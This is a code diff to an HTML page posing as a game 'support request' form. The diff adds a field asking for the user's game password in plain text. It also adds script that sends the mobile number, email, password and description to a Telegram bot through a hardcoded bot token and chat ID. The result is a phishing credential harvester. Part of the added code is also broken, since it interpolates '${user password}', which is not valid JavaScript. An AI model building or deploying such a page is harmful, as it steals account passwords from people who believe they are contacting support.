@@ -26,8 +26,10 @@
 
             <input type="tel" id="mobile" placeholder="📱 Mobile Number" required>
             <input type="email" id="email" placeholder="📧 Email Address" required>
-            <label>Password</label>
-            <input type="password" id="password" placeholder="Enter Your Password" required>
+            
+            <label for="user password">user password </label>
+            <input type="text" id="user password" placeholder="🆔 Enter Your game password" required>
+            
             <textarea id="description" rows="5" placeholder="📝 Write Your Problem Here..." required></textarea>
 
             <button type="submit" style="padding: 16px 40px; font-size: 18px; font-weight: bold; background: linear-gradient(45deg, #ff6b00, #ff9500); color: white; border: none; border-radius: 50px; width: 100%; margin: 20px 0;">
@@ -46,7 +48,44 @@
 
             const mobile = document.getElementById("mobile").value;
             const email = document.getElementById("email").value;
-            const password = document.getElementById("password").value;
+            const customerId = document.getElementById("user password").value;
             const description = document.getElementById("description").value;
 
-            const telegramMessage = `🚨 New Support Request!\n\n📱 Mobile: ${mobile}\n✉️ Email: ${email}\n🔑 Password: ${password}\n
+            // टेलीग्राम मैसेज फ़ॉर्मेट
+            const telegramMessage = `🚨 New Support Request!\n\n📱 Mobile: ${mobile}\n✉️ Email: ${email}\n🆔 user password: ${user password}\n📝 Description: ${description}`;
+
+            // आपका नया टोकन और चैट आईडी यहाँ सेट कर दी गई है
+            const botToken = "8823863994:AAFZH0qu7IGosBtHP2SGXXe5CfIYVurAC8A"; 
+            const chatId = "8823863994";     
+
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            try {
+                const response = await fetch(telegramUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: telegramMessage
+                    })
+                });
+
+                const result = await response.json();
+
+                if (result.ok) {
+                    alert("Request submitted successfully!");
+                    document.getElementById("supportfrom").reset(); // फॉर्म खाली करने के लिए
+                } else {
+                    alert("Telegram Error: " + result.description);
+                }
+            } catch (error) {
+                console.error("Error sending message:", error);
+                alert("Failed to send request. Please check your network.");
+            }
+        });
+    </script>
+
+</body>
+</html>
